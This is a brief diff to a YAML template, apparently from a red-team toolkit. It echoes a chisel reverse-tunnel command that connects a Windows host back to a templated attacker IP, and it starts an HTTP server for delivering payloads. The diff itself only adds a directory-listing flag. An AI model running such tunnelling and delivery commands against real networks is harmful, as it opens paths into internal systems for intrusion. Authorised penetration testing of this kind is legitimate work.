@@ -22,4 +22,4 @@ content: |
   echo "To run: {{ delivery_path_windows }}\chisel.exe client {{ attacker_ip }}:{{ proxy_port }} R:$kali_port:$target:$target_port"; \
   echo "Expected Result: You should be able to reach $target:$target_$port on 127.0.0.1:$kali_port"; \
   echo '================================================================'; \
-  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound
+  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
